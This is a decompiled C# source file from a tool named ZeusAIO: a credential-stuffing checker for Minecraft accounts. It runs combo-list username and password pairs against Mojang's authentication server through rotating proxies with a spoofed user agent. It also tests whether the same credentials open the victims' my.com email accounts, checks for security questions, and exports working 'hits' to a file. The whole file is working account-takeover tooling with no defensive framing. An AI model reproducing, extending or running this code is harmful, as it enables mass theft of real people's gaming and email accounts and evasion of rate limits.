// Decompiled with JetBrains decompiler
// Type: Minecraft.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Minecraft
{
  internal class Check
  {
    private static Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = false;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            string str1 = httpRequest.Post("https://authserver.mojang.com/authenticate", "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"" + s[0] + "\",\"password\": \"" + s[1] + "\",\"requestUser\": \"true\"}", "application/json").ToString();
            if (str1.Contains("selectedProfile"))
            {
              JObject jobject = (JObject) JsonConvert.DeserializeObject(str1);
              string str2 = (string) jobject["selectedProfile"][(object) "name"];
              string token = (string) jobject["accessToken"];
              string str3 = "NFA";
              if (Check.MailAccessCheck(s[0], s[1]) == "Working")
                str3 = "MFA";
              else if (Check.SFACheck(token))
                str3 = "SFA";
              ++mainmenu.hits;
              if (mainmenu.p1 == "2")
                Colorful.Console.WriteLine("[HIT - MINECRAFT] " + s[0] + ":" + s[1] + " | " + str3 + " - Username: " + str2, Color.Green);
              Export.AsResult("/Minecraft_hits", s[0] + ":" + s[1] + " | " + str3 + " - Username: " + str2);
              return false;
            }
            if (!str1.Contains("{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}"))
            {
              if (str1.Contains("{\"error\":\"JsonParseException\",\"errorMessage\":\"Unexpected character "))
                break;
            }
            else
              break;
          }
        }
        catch (Exception ex)
        {
          ++mainmenu.errors;
        }
      }
      return false;
    }

    public static bool SFACheck(string token)
    {
      while (true)
      {
        try
        {
          using (HttpRequest req = new HttpRequest())
          {
            Check.SetBasicRequestSettingsAndProxies(req);
            req.AddHeader("Authorization", "Bearer " + token);
            if (req.Get(Check.SFACheckUri).ToString() == "[]")
              return true;
            break;
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
      return false;
    }

    private static string MailAccessCheck(string email, string password)
    {
      while (true)
      {
        try
        {
          using (HttpRequest req = new HttpRequest())
          {
            Check.SetBasicRequestSettingsAndProxies(req);
            req.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
            if (req.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
              return "Working";
            break;
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
      return "";
    }

    private static void SetBasicRequestSettingsAndProxies(HttpRequest req)
    {
      req.IgnoreProtocolErrors = true;
      req.ConnectTimeout = 10000;
      req.KeepAliveTimeout = 10000;
      req.ReadWriteTimeout = 10000;
      string[] strArray = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount)).Split(':');
      ProxyClient proxyClient = mainmenu.proxyProtocol == "SOCKS5" ? (ProxyClient) new Socks5ProxyClient(strArray[0], int.Parse(strArray[1])) : (mainmenu.proxyProtocol == "SOCKS4" ? (ProxyClient) new Socks4ProxyClient(strArray[0], int.Parse(strArray[1])) : (ProxyClient) new HttpProxyClient(strArray[0], int.Parse(strArray[1])));
      if (strArray.Length == 4)
      {
        proxyClient.Username = strArray[2];
        proxyClient.Password = strArray[3];
      }
      req.Proxy = proxyClient;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
